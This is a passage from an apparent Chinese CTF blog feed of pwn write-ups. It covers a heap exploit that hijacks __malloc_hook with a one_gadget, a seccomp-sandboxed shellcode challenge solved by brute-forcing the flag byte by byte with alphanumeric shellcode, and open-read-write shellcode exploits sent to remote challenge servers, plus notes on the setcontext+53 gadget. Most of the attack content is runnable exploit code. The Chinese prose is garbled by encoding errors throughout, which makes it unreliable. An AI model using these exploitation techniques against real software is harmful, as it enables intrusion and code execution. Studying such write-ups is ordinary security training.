class="hljs-number">0x208</span> + p64(heap_addr + <span class="hljs-number">0x2e0</span>))<br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4f432</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(mlh - <span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">1</span>, p64(ogg) + p64(realloc + <span class="hljs-number">9</span>))<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091318701.png" alt="image-20211003091318701"></p><p>ç¨‹åºå¾ˆç®€å•ï¼Œæ€»çš„è¯´å°±æ˜¯è¾“å…¥å†…å®¹ï¼Œç„¶åè½¬ç§»åˆ°å¯æ‰§è¡Œçš„åœ°å€ä¸Šå»æ‰§è¡Œã€‚</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091835842.png" alt="image-20211003091835842"></p><p>ç„¶åå¼€å¯äº†æ²™ç®±ï¼Œåªå…è®¸ä½¿ç”¨ open å’Œ read å‡½æ•°ï¼ŒåŒæ—¶è¦æ±‚ read å‡½æ•°çš„ fd å‚æ•°å³ç§»32ä½åä»ç„¶å¤§äº0æˆ–è€…æ˜¯å¤§ç­‰.äº4</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091716855.png" alt="image-20211003091716855"></p><p>å¯å†™å¯æ‰§è¡Œæ®µåœ¨0x10000~0x11000</p><p>é¦–å…ˆorwæ˜¯æ²¡è·‘äº†ï¼Œä½†æ˜¯æ²¡æœ‰writeï¼Œæ‰€ä»¥åªèƒ½æ˜¯é€å­—èŠ‚è¿›è¡Œçˆ†ç ´çš„æ€æƒ³ï¼šæ ¹æ®æ˜¯å¦å¼‚å¸¸åŒºåˆ†çˆ†ç ´çš„å­—ç¬¦å¯¹é”™ã€‚ä½†æ˜¯æˆ‘æ„£æ˜¯æ²¡åšå‡ºæ¥ï¼Œç®—äº†ï¼Œæ€æƒ³çŸ¥é“å°±è¡Œï¼Œå®˜æ–¹wpæˆ‘è·‘äº†æœ¬åœ°ä¹Ÿæ²¡å‡ºï¼Œå·®è¯„ï¼</p><p>è´´ä¸ªå®˜æ–¹çš„wpå¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64  <br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;DEBUG&#x27;</span>]:  <br>    context.log_level = <span class="hljs-string">&quot;debug&quot;</span>  <br>code = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)  <br>context.arch=code.arch  <br>  <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">idx, ch</span>):</span>  <br>    tmp = <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27; </span><br><span class="hljs-string">    open_sec: </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp x </span><br><span class="hljs-string">        y:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp p </span><br><span class="hljs-string">        q:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            push rax </span><br><span class="hljs-string">            pop rdi </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            xor rdx, rdx </span><br><span class="hljs-string">            add dl, 0xff </span><br><span class="hljs-string">            mov rsi, rsp </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            mov al, [rsp+&#123;&#125;] </span><br><span class="hljs-string">            cmp al, &#123;&#125; </span><br><span class="hljs-string">            jne tmp </span><br><span class="hljs-string">            jmp $ </span><br><span class="hljs-string">        tmp: </span><br><span class="hljs-string">            xor rax,rax  </span><br><span class="hljs-string">            add al,60 </span><br><span class="hljs-string">            xor rdi,rdi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">        x: </span><br><span class="hljs-string">            call y </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">        p: </span><br><span class="hljs-string">            call q </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(idx, <span class="hljs-built_in">ord</span>(ch))  <br>  <br>    shellcode = asm(tmp)  <br>    <span class="hljs-comment"># get alphanumeric shellcode  </span><br>      <br>    <span class="hljs-keyword">return</span> AE64().encode(shellcode, <span class="hljs-string">&#x27;rdx&#x27;</span>).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)  <br>  <br>flag = <span class="hljs-string">&#x27;&#x27;</span>  <br>i = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> string.printable:  <br>        conn = process(<span class="hljs-string">&quot;./chall&quot;</span>)    <br>        conn.sendlineafter(<span class="hljs-string">&quot;?\n&quot;</span>, payload(i, x))  <br>        <span class="hljs-keyword">try</span>:  <br>            conn.recv(<span class="hljs-number">1</span>, timeout=<span class="hljs-number">1</span>)  <br>        <span class="hljs-keyword">except</span> EOFError:  <br>            conn.close()  <br>            <span class="hljs-keyword">continue</span>  <br>        <span class="hljs-built_in">print</span>(flag,i)  <br>        flag += x  <br>        i += <span class="hljs-number">1</span>  <br>        conn.close()  <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:  <br>            <span class="hljs-built_in">print</span>(flag)  <br>            exit()  <br>        <span class="hljs-keyword">break</span>  <br>  <br>conn.interactive()  <br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å¤ªèœäº†ï¼Œä¸€é¢˜æ²¡å‡ºï¼›åˆæ˜¯æŠ±ç€å¤§ä½¬WPè·Ÿç€å¤ç°~&lt;/p&gt;
&lt;p&gt;æ¥æºï¼š&lt;a href=&quot;http://www.darry-long.top/20</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>orw</title>
    <link href="http://example.com/2021/09/21/2021-09-21-orw/"/>
    <id>http://example.com/2021/09/21/2021-09-21-orw/</id>
    <published>2021-09-21T09:02:18.000Z</published>
    <updated>2021-10-13T08:01:24.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯å‰ç½®"><a href="#èƒŒæ™¯å‰ç½®" class="headerlink" title="èƒŒæ™¯å‰ç½®"></a>èƒŒæ™¯å‰ç½®</h2><p>seccomp æ˜¯ secure computing çš„ç¼©å†™ï¼Œå…¶æ˜¯ Linux kernel ä»2.6.23ç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§ç®€æ´çš„ sandboxing æœºåˆ¶ã€‚åœ¨ Linux ç³»ç»Ÿé‡Œï¼Œå¤§é‡çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ç›´æ¥æš´éœ²ç»™ç”¨æˆ·æ€ç¨‹åºã€‚ä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨éƒ½è¢«éœ€è¦ï¼Œè€Œä¸”ä¸å®‰å…¨çš„ä»£ç æ»¥ç”¨ç³»ç»Ÿè°ƒç”¨ä¼šå¯¹ç³»ç»Ÿé€ æˆå®‰å…¨å¨èƒã€‚seccompå®‰å…¨æœºåˆ¶èƒ½ä½¿ä¸€ä¸ªè¿›ç¨‹è¿›å…¥åˆ°ä¸€ç§â€œå®‰å…¨â€è¿è¡Œæ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹çš„è¿›ç¨‹åªèƒ½è°ƒç”¨4ç§ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ï¼Œå³ read(), write(), exit() å’Œ sigreturn()ï¼Œå¦åˆ™è¿›ç¨‹ä¾¿ä¼šè¢«ç»ˆæ­¢ã€‚</p><p><code>orw_seccompå‡½æ•°</code>æ‰§è¡Œäº†ä¸¤æ¬¡<code>prctl</code>å‡½æ•°ï¼ˆå‡ºç°prctlå°±æ˜¯æ²™ç®±çš„é¢˜ç›®ï¼‰</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ç¬¬ä¸€æ¬¡è°ƒç”¨prctlå‡½æ•° â€”â€”â€”â€”ç¦æ­¢ææƒ<br>ç¬¬äºŒæ¬¡è°ƒç”¨prctlå‡½æ•° â€”â€”â€”â€”é™åˆ¶èƒ½æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨åªæœ‰openï¼Œ<span class="hljs-built_in">write</span>ï¼Œ<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>æ„æ€å°±æ˜¯æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ç‰¹æ®Šçš„ç³»ç»Ÿè°ƒç”¨getshellï¼Œä½†æ˜¯å¯ä»¥ç”¨openã€readã€writeä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å»è¯»flag</p><h2 id="å…¥é—¨çº§orw"><a href="#å…¥é—¨çº§orw" class="headerlink" title="å…¥é—¨çº§orw"></a>å…¥é—¨çº§orw</h2><h3 id="ä¸€ã€pwnable-orw"><a href="#ä¸€ã€pwnable-orw" class="headerlink" title="ä¸€ã€pwnable_orw"></a>ä¸€ã€pwnable_orw</h3><p>æ¥è‡ªbuuä¸Šçš„</p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121233.png"></p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121208.png"></p><p>é¦–å…ˆchecksecå®Œï¼Œå‘ç°åªå¼€äº†canaryï¼Œæ”¾å…¥idaçœ‹çœ‹ã€‚å‘ç°ï¼Œå¯ä»¥è¾“å…¥æ•°æ®ï¼Œç„¶åè¿˜èƒ½å¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œæ‰§è¡Œè°ƒç”¨ã€‚å› ä¸ºè¿™å¼€å¯æ²™ç®±ï¼Œç³»ç»Ÿè°ƒç”¨æ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œåªèƒ½é€šè¿‡openæ‰“å¼€flagï¼Œç„¶åreadè¯»åˆ°ç¼“å†²åŒºä¸Šï¼Œå†é€šè¿‡writeæ³„éœ²å‡ºæ¥ï¼Œä»è€Œå¾—åˆ°flag</p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522122706.png"></p><p>ç¬¬ä¸€ä¸ªexpæ˜¯è‡ªå·±å»æ„é€ æ‰§è¡ŒæŒ‡ä»¤ï¼Œç¬¬äºŒä¸ªæ˜¯ç”¨pwntoolé‡Œé¢è‡ªå¸¦çš„shellcraftçš„åŠŸèƒ½ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œç¬¬äºŒä¸ªä¼šæ›´æ–¹ä¾¿è®¸å¤š</p><p>expçš„è¯¦ç»†è§£æï¼šï¼ˆæ¥è‡ª<a href="https://blog.csdn.net/qq_44768749/article/details/108256099%EF%BC%89">https://blog.csdn.net/qq_44768749/article/details/108256099ï¼‰</a></p><p>æ‰“å¼€flagæ–‡ä»¶ï¼Œsys_open(file,0,0)ï¼›ç³»ç»Ÿè°ƒç”¨å·ä¸º5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 0x0  #å­—ç¬¦ä¸²ç»“å°¾<br>push 0x67616c66#&#x27;flag&#x27;<br>mov ebx,esp<br>xor ecx,ecx#0<br>xor edx,edx#0<br>mov eax,0x5#è°ƒç”¨å·<br>int 0x80#sys_open(flags,0,0)<br></code></pre></td></tr></table></figure><p> è¯»flagæ–‡ä»¶ï¼Œsys_read(3,file,0x100)ï¼›ç³»ç»Ÿè°ƒç”¨å·ä¸º3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0x3; <br>mov ecx,ebx;# ecx = char __user *buf ç¼“å†²åŒºï¼Œè¯»å‡ºçš„æ•°æ®--&gt;ä¹Ÿå°±æ˜¯è¯»â€œflagâ€<br>mov ebx,0x3;# æ–‡ä»¶æè¿°ç¬¦ fd:æ˜¯æ–‡ä»¶æè¿°ç¬¦ 0 1 2 3 ä»£è¡¨æ ‡å‡†çš„è¾“å‡ºè¾“å…¥å’Œå‡ºé”™,å…¶ä»–æ‰“å¼€çš„æ–‡ä»¶<br>mov edx,0x100;#å¯¹åº”å­—èŠ‚æ•°<br>int 0x80;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºflagæ–‡ä»¶å†…å®¹ï¼Œsys_write(1,file,0x30)ï¼›ç³»ç»Ÿè°ƒç”¨å·ä¸º4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0x4;# eax = sys_write<br>mov ebx,0x1;# ebx = unsigned int fd = 1<br>int 0x80;<br></code></pre></td></tr></table></figure><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br><br>shellcode=asm(<span class="hljs-string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>exp2ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="äºŒã€easy-shellcode"><a href="#äºŒã€easy-shellcode" class="headerlink" title="äºŒã€easy_shellcode"></a>äºŒã€easy_shellcode</h3><p>æ¥è‡ª2021NEEPU çº³æ–°CTFä¸Šçš„ä¸€é“é¢˜</p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123857.png"></p><p>64ä½ï¼Œä¿æŠ¤å…¨å¼€</p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123942.png"></p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522130822.png"></p><p>è·Ÿä¸Šé¢å¾ˆç±»ä¼¼ï¼Œä¹Ÿæ˜¯æœ‰ä¸ªç›´æ¥è¾“å…¥ç‚¹ï¼Œç„¶åè°ƒç”¨æ‰§è¡Œè¾“å…¥çš„æ•°æ®ï¼Œå€Ÿç”¨shellcraftï¼ŒæŠŠå¯„å­˜å™¨æ”¹ä¸º64ä½ä¸‹çš„å³å¯è·å–flag</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;neepusec.club&quot;</span>,<span class="hljs-number">18626</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>shellcode+=asm(shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>shellcode+=asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;orw&quot;</span>,shellcode)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="å †ä¸Šorw"><a href="#å †ä¸Šorw" class="headerlink" title="å †ä¸Šorw"></a>å †ä¸Šorw</h2><p>å‰é¢å‘¢ï¼Œéƒ½æ˜¯ä¸€äº›æœ‰å…³äºorwæ€æƒ³çš„å…¥é—¨åŸºç¡€é¢˜ï¼Œè€Œæ¯”èµ›ä¸­å¸¸è§çš„éƒ½æ˜¯å †ä¸Šçš„orw</p><h3 id="ä½ç‰ˆæœ¬"><a href="#ä½ç‰ˆæœ¬" class="headerlink" title="ä½ç‰ˆæœ¬"></a>ä½ç‰ˆæœ¬</h3><p>ä¸€èˆ¬åœ¨ <code>Glibc2.29</code>ä»¥å‰çš„ <code>ORW</code>è§£é¢˜æ€è·¯å·²ç»æ¯”è¾ƒæ¸…æ™°ï¼Œä¸»è¦æ˜¯åŠ«æŒ <code>free_hook</code> æˆ–è€… <code>malloc_hook</code>å†™å…¥ <code>setcontext+53</code>å‡½æ•°ä¸­çš„ gadgetï¼Œé€šè¿‡ <code>rdi</code>ç´¢å¼•ï¼Œæ¥è®¾ç½®ç›¸å…³å¯„å­˜å™¨ï¼Œå¹¶æ‰§è¡Œæå‰å¸ƒç½®å¥½çš„ <code>ORW ROP chains</code></p><p>setcontext+53å¤„çš„gadgetå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]<br>&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]<br>&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]<br>&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]<br>&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]<br>&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]<br>&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]<br>&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]<br>&lt;setcontext+94&gt;:  push   rcx<br>&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]<br>&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]<br>&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]<br>&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]<br>&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]<br>&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]<br>&lt;setcontext+125&gt;: xor    eax,eax<br>&lt;setcontext+127&gt;: ret<br></code></pre></td></tr></table></figure><p>ç›®çš„æ˜¯è·å¾—ä¸€ä¸ªå¯æ‰§è¡Œçš„æƒé™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<code>mov rsp, [rdi+0xa0]</code>å’Œ<code>mov rcx, [rdi+0xa8]</code>ã€‚ä¿®æ”¹rspçš„å€¼å°†ä¼šæ”¹å˜æ ˆæŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å°±è·å¾—äº†æ§åˆ¶æ ˆçš„èƒ½åŠ›ï¼Œä¿®æ”¹rcxçš„å€¼åæ¥ç€æœ‰ä¸ªpushæ“ä½œå°†rcxå‹æ ˆï¼Œç„¶åæ±‡ç¼–æŒ‡ä»¤æŒ‰ç…§é¡ºåºä¼šæ‰§è¡Œä»£ç ä¸­æœ€åçš„retæ“ä½œï¼Œè€Œretå»æ‰§è¡Œçš„åœ°å€å°±æ˜¯å‹å…¥æ ˆçš„rcxå€¼ï¼Œå› æ­¤ä¿®æ”¹rcxå°±è·å¾—äº†æ§åˆ¶ç¨‹åºæµç¨‹çš„èƒ½åŠ›</p><p>ä½†æ˜¯ä¸ºäº†èƒ½æ‰§è¡Œåˆ°è¿™ï¼Œæˆ‘ä»¬å…ˆè¦åšçš„å°±æ˜¯åŠ«æŒfree_hookæˆ–è€…malloc_hookä¸º<code>setcontext + 53</code>çš„åœ°å€ï¼Œè·³è½¬åˆ°è¿™è¾¹æ¥æ‰§è¡Œä¸Šé¢çš„gadgetsï¼Œä½†è¿™éƒ½ä¸æ˜¯é‡ç‚¹ï¼Œé‡ç‚¹æ˜¯<code>setcontext + 53</code>ä¸Šçš„ä¼ å‚è®¾ç½®ã€‚å› ä¸ºéƒ½æ˜¯å€Ÿç”¨rdiä¼ å‚ï¼Œåˆšå¥½æˆ‘ä»¬æ‰§è¡Œmallocæˆ–è€…freeç”³è¯·æˆ–æ˜¯é‡Šæ”¾å †å—æ—¶ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å †çš„åœ°å€ï¼Œæ˜¯å­˜åœ¨rdiä¸Šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é‡Šæ”¾æˆ–è€…ç”³è¯·çš„å †å—çš„åœ°å€ååˆ†å…³é”®ï¼Œåœ¨å…¶åç§»0xa0å’Œ0xa8çš„ä½ç½®åˆ†åˆ«å¡«ä¸Šæˆ‘ä»¬å­˜å‚¨orwé“¾å†…å®¹çš„åœ°å€ï¼ˆæ³¨æ„ä¸æ˜¯orwçš„ç¬¬ä¸€ä¸ªæŒ‡ä»¤åœ°å€ï¼‰å’Œä¸€ä¸ªretæ±‡ç¼–æŒ‡ä»¤çš„åœ°å€</p><p>æ³¨ï¼šä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥æ˜¯orwçš„åœ°å€ï¼šå› ä¸ºæ‰§è¡Œå®Œsetcontext + 53ä¸Šçš„gadgetä¼šæ‰§è¡Œretï¼Œè€Œretæ‰§è¡Œçš„rcxæŒ‡å‘çš„åœ°å€ï¼Œå¦‚æœrcxè£…çš„æ˜¯mprotectçš„åœ°å€ï¼Œæ‰§è¡Œå®Œmprotectå°±ä¼šå»æ‰§è¡ŒrspæŒ‡å‘çš„åœ°å€ï¼Œæ³¨æ„æ˜¯åœ°å€ï¼å¦‚æœå‰é¢ç›´æ¥ä¼ å…¥rspçš„æ˜¯orwçš„ç¬¬ä¸€ä¸ªæŒ‡ä»¤åœ°å€ï¼Œé‚£ä¹ˆretæ‰§è¡Œçš„æ˜¯æŠŠå†™åœ¨ä¸Šé¢çš„æŒ‡ä»¤ä½œä¸ºä¸€ä¸ªåœ°å€è§£æï¼Œç›´æ¥å°±ä¼šæŠ¥é”™äº†ï¼Œå› ä¸ºripè·å–çš„æ˜¯æ ˆé¡¶çš„å€¼ï¼Œæ‰€ä»¥è¦ä¸­è½¬ä¸€ä¸‹ï¼Œå‰é¢å†™çš„æ˜¯å¦å¤–ä¸€ä¸ªåœ°å€ï¼ˆä¸€èˆ¬å°±ç›´æ¥åœ¨shellcodeå‰å…«ä¸ªå­—èŠ‚çš„åœ°æ–¹ï¼‰ï¼Œç„¶ååœ¨è¿™ä¸ªåœ°å€ä¸Šå†™å…¥çš„æ‰æ˜¯shellcodeçš„åœ°å€</p><p>å¯ä»¥è‡ªå·±ç®—åç§»ï¼Œä¹Ÿå¯ä»¥å€Ÿç”¨pwntoolsçš„SigreturnFrameç±»ç›´æ¥æ¥æ„é€ ã€‚æ­¤æ—¶frameä¸­çš„rspå’Œripå¯¹åº”çš„å°±æ˜¯setcontextçš„rspå’Œrcx</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 